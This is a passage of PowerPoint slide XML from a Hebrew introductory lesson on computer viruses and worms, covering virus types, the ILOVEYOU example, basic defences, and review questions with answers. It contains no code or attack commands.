              <a:t> USB </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או אפילו דרך אימיילים וקישורים זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>לוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחת הדוגמאות המפורסמות ביותר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא וירוס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ILOVEYOU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הזה התפשט בשנת 2000 דרך אימיילים שנשאו את הכותרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ILOVEYOU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והכילו קובץ מצורף שנראה תמים. כאשר הנמען פתח את הקובץ, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התחיל לשכפל את עצמו ולשלוח את אותו האימייל לכל אנשי הקשר של המשתמש, תוך גרימת נזק רב למחשבים ברחבי העולם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1414344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68E155A-0C45-459E-962F-2D6615E7D534}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="642594"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי וירוסים נפוצים:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E72A9C7B-4758-49C6-AF53-5F4F8E3D0513}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>וירוס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Boot Sector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וירוס שתוקף את ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Master Boot Record (MBR) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הכונן הקשיח או של הדיסקט, והוא נטען עם הפעלת המחשב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>וירוס קבצים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - וירוס שתוקף קבצים מסוימים, בדרך כלל קבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומדביק אותם כאשר הם מופעלים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>וירוס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Macro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: וירוס שתוקף קבצים שמכילים סקריפטים או פקודות מאקרו, כמו קבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Word </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Excel</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1198452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6742AA9-1627-4B94-BEE4-F7C81D81EA6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4263886" y="642594"/>
            <a:ext cx="6861313" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך מתגוננים מפני וירוסים?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9502193E-7329-4326-B560-1D63A6B9554A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקנת תוכנת אנטי-וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - תוכנת אנטי-וירוס היא כלי שמזהה ומסיר וירוסים ממחשב, והיא מעודכנת על בסיס קבוע כדי לזהות איומים חדשים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הימנעות מפתיחת קבצים מצורפים חשודים באימיילים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - חשוב להימנע מפתיחת קבצים מצורפים מאנשים שאינכם מכירים או מאימיילים שנראים חשודים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גיבוי קבוע של הנתונים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - במקרה של התקפה, גיבוי קבוע של הנתונים מאפשר לשחזר את הקבצים המקוריים ללא חשש.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25522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4F61B5A-1C6A-480D-AACA-6386098009D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7354956" y="642594"/>
            <a:ext cx="3770243" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות - וירוס</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{016D7C77-4735-4AB8-B8BF-0C68930B9E34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהי המטרה העיקרית של וירוס מחשב?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד וירוס יכול להדביק קבצים אחרים במחשב?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. איך וירוסים מנצלים פרצות אבטחה במערכות הפעלה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מהו "וירוס זמן"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Time Bomb Virus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וכיצד הוא פועל?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. מהן הדרכים הבסיסיות להגן על מחשב מפני וירוסים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2124334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27A4F20-EAEC-454D-A86D-99667BFAE9BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7305261" y="137160"/>
            <a:ext cx="3819939" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות - וירוס</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E89A2914-3357-4DFE-A09E-9E73F7C59C82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1508760"/>
            <a:ext cx="10058400" cy="5406887"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. המטרה העיקרית של וירוס מחשב היא לשבש את פעילות המחשב, לגנוב מידע רגיש, או להפיץ את עצמו למחשבים אחרים. הווירוס מופעל כאשר תוכנה נגועה מופעלת או כאשר מערכת ההפעלה נפרצת. וירוסים יכולים לגרום לנזק כמו השחתת קבצים, גניבת מידע, או השבתת מערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. וירוס נצמד לקבצים או תוכנות לגיטימיים, ולאחר שהקובץ הנגוע מופעל, הווירוס מתפשט לקבצים נוספים. הוא עושה זאת על ידי שיבוש הקוד בקובץ הקיים או באמצעות יצירת עותקים של עצמו. כך, הווירוס יכול להדביק חלקים נוספים במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. וירוסים מנצלים חולשות במערכות הפעלה, כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בקוד או בתוכנות לא מעודכנות. הם יכולים להיכנס דרך פרצות אלו, ואז להשתלט על המערכת או להפיץ את עצמם. זו הסיבה שמומלץ לעדכן באופן קבוע את התוכנות במחשב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. "וירוס זמן" מתוכנת להתפשט ולהתחיל לפעול בנקודת זמן מסוימת. הוא נשאר במערכת בלי לגרום נזק עד שמגיע התאריך או התנאי שהוגדר מראש. לאחר מכן, הווירוס מופעל ויכול לגרום לנזק, כמו השחתת קבצים או השבתת המערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. כדי להגן על מחשב מפני וירוסים יש להשתמש בתוכנת אנטי-וירוס מעודכנת, להימנע מהורדת קבצים ממקורות לא אמינים, ולא לפתוח קבצים מצורפים חשודים באימיילים. כמו כן, חשוב לעדכן את מערכת ההפעלה והתוכנות בקביעות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35526794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1C4C934B-AFCF-4E15-A4EE-FA523C474533}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8800" dirty="0"/>
              <a:t>תולעים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8800" dirty="0"/>
              <a:t>Worms</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="8800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23585754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4B58A91-B9F8-47A4-A9DA-E07C132C3007}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3279912" y="642594"/>
            <a:ext cx="7845287" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Worms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5745F0EF-AF97-4DD9-B213-9B5E7A2D6287}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2441050"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה זו תולעת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Worm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא סוג של תוכנה זדונית שמפיצה את עצמה במערכות מחשב או רשתות בלי צורך בהתערבות המשתמש. בניגוד לווירוסים, תולעים אינן זקוקות לקובץ מארח כדי להתפשט – הן פשוט מנצלות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במערכות כדי להתפשט עצמאית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1098034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04055D2-E81E-4E46-B823-07D63C23BCBC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848060" y="642594"/>
            <a:ext cx="4277139" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Worms</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79F6EEA7-6B9E-458A-AD34-B3727DADEDFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך תולעת פועלת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. זיהוי פגיעות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תולעת מחפשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או חולשות במערכת היעד. היא עשויה לנצל פרצות בתוכנות או בהגדרות רשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. התפשטות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לאחר שהפגיעות זוהתה, התולעת מעתיקה את עצמה למערכת היעד. זה יכול להיות דרך רשתות תקשורת, דוא"ל, או אמצעים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. הפצת חיקויים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: התולעת מחפשת מערכות נוספות להתפשט אליהן באותו אופן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. ביצוע משימות נוספות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: פעמים רבות תולעים מבצעות פעולות נוספות כמו גניבת נתונים, התקנת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, או התקנת תוכנות זדוניות נוספות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36695893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D4EFE41-8BB4-4EAF-BE9B-894DA6616787}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5198165" y="642594"/>
            <a:ext cx="5927034" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד תולעים מתפשטות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB8BA5D7-602F-4ABD-80F7-0743D791BF1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעים יכולות להתפשט בכמה דרכים, ולרוב הן מנצלות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או חולשות במערכות המחשב:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוא"ל</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תולעים יכולות להתפשט דרך דוא"ל עם קבצים מצורפים זדוניים או קישורים שמפנים לאתרים זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>רשתות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תולעים יכולות לנצל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בפרוטוקולים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SMB (Server Message Block)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSH (Secure Shell)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לגשת למערכות אחרות ברשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אינטרנט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תולעים יכולות לנצל חולשות באתרים או ביישומים אינטרנטיים כדי להדביק מחשבים חדשים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אמצעי אחסון ניידים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תולעים יכולות להעתיק את עצמן לאמצעי אחסון ניידים כמו דיסק-און-קי ולהתפשט כאשר הם מחוברים למחשב אחר.</a:t>
